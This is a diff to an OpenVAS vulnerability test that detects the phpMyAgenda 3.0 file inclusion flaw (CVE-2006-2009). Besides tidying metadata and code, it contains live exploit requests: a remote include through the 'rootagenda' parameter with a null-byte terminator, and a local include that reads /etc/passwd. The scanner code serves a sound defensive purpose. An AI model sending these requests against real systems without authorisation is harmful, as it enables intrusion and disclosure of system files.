@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: phpMyAgenda_30final_file_include.nasl 4489 2016-11-14 08:23:54Z teissa $
+# $Id: phpMyAgenda_30final_file_include.nasl 5780 2017-03-30 07:37:12Z cfi $
 # Description: phpMyAgenda version 3.0 File Inclusion Vulnerability
 #
 # Authors:
@@ -46,27 +46,22 @@ Disable PHP's 'register_globals'";
 # Original advisory / discovered by : 
 # http://www.securityfocus.com/archive/1/431862/30/0/threaded
 
-if (description) {
+if (description)
+{
  script_id(200002);
- script_version("$Revision: 4489 $");
- script_tag(name:"last_modification", value:"$Date: 2016-11-14 09:23:54 +0100 (Mon, 14 Nov 2016) $");
+ script_version("$Revision: 5780 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-30 09:37:12 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
  script_cve_id("CVE-2006-2009");
  script_bugtraq_id(17670);
-
- name = "phpMyAgenda version 3.0 File Inclusion Vulnerability";
- script_name(name);
- summary = "Checks for a possible file inclusion flaw in phpMyAgenda";
-
+ script_name("phpMyAgenda version 3.0 File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
-
- script_dependencies("http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : tag_solution);
@@ -77,48 +72,41 @@ if (description) {
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
 
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
-dirs = make_list("/phpmyagenda", "/agenda", cgi_dirs());
+foreach dir( make_list_unique( "/phpmyagenda", "/agenda", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
+ if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/agenda.php3"), port:port);
- #debug_print("res: ", res, "\n");
  
  if(egrep(pattern:"<a href=[^?]+\?modeagenda=calendar", string:res)) {
   file[0] = string("http://", get_host_name(), dir, "/bugreport.txt");
   file[1] = "/etc/passwd";
 
   req = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[0], "%00"), port:port);
-  #debug_print("request1= ", req, "\n");
-
   recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
-  #debug_print("receive1= ", recv, "\n");
-  if (recv == NULL) exit(0);
+  if (recv == NULL) continue;
 
   if ("Bug report for phpMyAgenda" >< recv) {
-   security_message(port);
+   security_message(port:port);
    exit(0);
   }
   else { 
    # Maybe PHP's 'allow_url_fopen' is set to Off on the remote host.
    # In this case, try a local file inclusion.
    req2 = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[1], "%00"), port:port);
-   #debug_print("request2= ", req2, "\n");
-
    recv2 = http_keepalive_send_recv(data:req2, bodyonly:TRUE, port:port);
-   #debug_print("receive2= ", recv2, "\n");
-   if (recv2 == NULL) exit(0);
+   if (recv2 == NULL) continue;
   
    if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv2)) {
     # PHP's 'register_globals' and 'magic_quotes_gpc' are enabled on the remote host.
-    security_message(port);
+    security_message(port:port);
     exit(0);
    }
   }
  }
 }
+
+exit( 99 );
